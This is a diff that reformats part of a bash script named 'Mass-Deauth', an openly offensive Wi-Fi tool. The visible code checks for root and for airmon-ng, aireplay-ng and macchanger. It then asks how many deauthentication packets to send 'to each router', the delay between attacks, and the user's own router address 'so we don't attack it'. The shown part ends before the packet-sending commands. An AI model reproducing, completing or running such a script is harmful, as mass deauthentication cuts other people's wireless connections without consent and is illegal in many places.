@@ -9,52 +9,44 @@
 
 ########################### LET'S CHECK ID AT THE DOOR
 if [[ $EUID -ne 0 ]]; then
-   echo -e "\033[31m\n    [!] This script MUST be run as root. Aborting . . . [!]\033[0m\n" 1>&2
-   sleep 1
-   exit 1
+	echo -e "\033[31m\n    [!] This script MUST be run as root. Aborting . . . [!]\033[0m\n" 1>&2
+	sleep 1; exit 1
 fi
 
 ########################### LET'S ALSO CHECK FOR REQUIRED PROGRAMS
 command -v xterm > /dev/null 2>&1 || {
 	echo -e >&2 "\033[31m\n    [!] This script requires Xterm to be installed. Aborting . . . [!]\033[0m\n"
-	sleep 1
-	exit 1
+	sleep 1; exit 1
 }
 command -v airmon-ng > /dev/null 2>&1 || {
 	echo -e >&2 "\033[31m\n    [!] This script requires Airmon-ng to be installed. Aborting . . . [!]\033[0m\n"
-	sleep 1
-	exit 1
+	sleep 1; exit 1
 }
 command -v aireplay-ng > /dev/null 2>&1 || {
 	echo -e >&2 "\033[31m\n    [!] This script requires Aireplay-ng to be installed. Aborting . . . [!]\033[0m\n"
-	sleep 1
-	exit 1
+	sleep 1; exit 1
 }
 command -v iw > /dev/null 2>&1 || {
 	echo -e >&2 "\033[31m\n    [!] This script requires iw to be installed. Aborting . . . [!]\033[0m\n"
-	sleep 1
-	exit 1
+	sleep 1; exit 1
 }
 command -v ip > /dev/null 2>&1 || {
 	echo -e >&2 "\033[31m\n    [!] This script requires ip to be installed. Aborting . . . [!]\033[0m\n"
-	sleep 1
-	exit 1
+	sleep 1; exit 1
 }
 command -v iwlist > /dev/null 2>&1 || {
 	echo -e >&2 "\033[31m\n    [!] This script requires iwlist to be installed. Aborting . . . [!]\033[0m\n"
-	sleep 1
-	exit 1
+	sleep 1; exit 1
 }
 command -v macchanger > /dev/null 2>&1 || {
 	echo -e >&2 "\033[31m\n    [!] This script requires GNU macchanger to be installed. Aborting . . . [!]\033[0m\n"
-	sleep 1
-	exit 1
+	sleep 1; exit 1
 }
 
 ########################### LOGICAL STUFF - don't touch unless you're 31337
 version="0.2"
 atk="0"
-MIFACE="mon0"  # monitor interface
+MIFACE="mon0"
 
 clear
 echo -e "\e[01;32m[+]\e[00m Setting up for attack..."
@@ -64,19 +56,16 @@ while [[ ! $WIFACE ]]; do
 	read -e WIFACE
 	sleep 1; echo
 done
-
 while [[ ! $DEAUTHS ]]; do
 	echo -e "\033[33m[>] How many deauthentication packets would you to send to each router?\033[0m"
 	read -e DEAUTHS
 	sleep 1; echo
 done
-
 while [[ ! $waitTime ]]; do
 	echo -e "\033[33m[>] How long would you like to wait (in seconds) between attacks?\033[0m"
 	read -e waitTime
 	sleep 1; echo
 done
-
 while [[ ! $ourAPmac ]]; do
 	echo -e "\033[33m[>] Enter the MAC address of your router (so we don't attack it):\033[0m"
 	read -e ourAPmac
@@ -97,11 +86,8 @@ function cleanup() {
 }
 
 trap cleanup INT
-
 ip link set $WIFACE up
-
 rmlogs
-
 xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Start $WIFACE" -e "ip link set $WIFACE up" &
 
 while [[ ! $moncheck ]]; do
